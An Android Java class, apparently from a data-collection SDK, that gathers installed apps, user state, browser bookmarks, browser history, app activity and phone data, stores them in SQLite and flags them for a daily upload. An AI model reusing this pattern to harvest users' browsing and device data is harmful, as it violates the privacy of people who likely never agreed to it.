package com.data.collect;

import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.data.configure.Constants;
import com.data.db.DBDataBase;
import com.data.db.DataContentValue;
import com.data.file.FilePath;
import com.data.file.FileState;
import com.data.info.AppInfo;
import com.data.info.CollectUtil;
import com.data.log.CrashHandler;

/**
 * Created by wanghao on 2015/1/23.
 */
public class MainCollect {

    Context context;
    private int idCount = 1;

    public MainCollect(Context context) {
        this.context = context;
    }

    public void getFileCollect() {

        //make file
        FileState fileState = new FileState();
        fileState.makeFileDir(context);

        //getInstalldeHashMaop
        AppInfo appInfo = new AppInfo();
        appInfo.getInstalledList();

        //get ConfigDatas
        ConfigCollect ccd = new ConfigCollect(context);
        ccd.getConfigDatas();

        //get UsrStateDatas
        UsrStateCollect uscd = new UsrStateCollect(context);
        uscd.getUsrStateDatas();

        //get BrowserBookmarkDatas
        BrowerBookmarkCollect bcd = new BrowerBookmarkCollect(context);
        bcd.getBrowerBookmarkDatas();

        //get BrowserHistoryDatas
        BrowserHistoryCollect bhc = new BrowserHistoryCollect(context);
        bhc.getBrowerHistoryDatas();

        //get AppActionDatas
        AppCollect ac = new AppCollect(context);
        ac.getAppCollect();

        //get PhoneDatas
        PhoneCollect pc = new PhoneCollect(context);
        pc.getPhoneCollect();

        //抓取配置表存的时间
        SharedPreferences sharedPreferences = context.getSharedPreferences(Constants.UPLOAD_SCHEDULE, Context.MODE_PRIVATE);
        String time = sharedPreferences.getString(Constants.TIME, "");

        SQLiteDatabase sqLiteDatabase = DBDataBase.getDBDataBase(context);
        Cursor c = DBDataBase.getDBCursor(sqLiteDatabase);
//        c.moveToNext();
//
//        //整理数据库
//        if (c.getCount() != 0 && c.getInt(c.getColumnIndex("id")) != 1) {
//            while (c.moveToNext()) {
//                if (c.getInt(c.getColumnIndex("id")) != idCount) {
//                    sqLiteDatabase.execSQL("UPDATE FileData SET id = " + idCount);
//                }
//                idCount++;
//            }
//        }

        //日期对比，判断是否应该建立新一天的数据库，是否应该上传文件,数据库为空
        if (!time.equals(CollectUtil.getDate()) || c.getCount() == 0) {
            //SQLiteOpenHelper dataDBHelper = new DataDBHelper(context, "FileData.db", null, 1);
            // SQLiteDatabase db = dataDBHelper.getWritableDatabase();

            SQLiteDatabase db = DBDataBase.getDBDataBase(context);

            //test
//            ContentValues cvTest = DataContentValue.getFileContentValuesTest();
//            db.insert("FileData", null, cvTest);
//            ContentValues cvTest1 = DataContentValue.getFileContentValuesTest1();
//            db.insert("FileData", null, cvTest1);

//            ContentValues cvTest3 = DataContentValue.getFileContentValuesTest3();
//            db.insert("FileData", null, cvTest3);

            ContentValues cv = DataContentValue.getFileContentValues();
            db.insert("FileData", null, cv);

            if(db.isOpen()){
                db.close();
            }

            //是否有文件需要上传
            Constants.uploadFlag = true;

            //第一次启动不需要上传
            if (time.equals("")) {
                Constants.uploadFlag = false;
            }
        }

        //存入数据库当日日期
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(Constants.TIME, CollectUtil.getDate());
        editor.commit();
    }
}
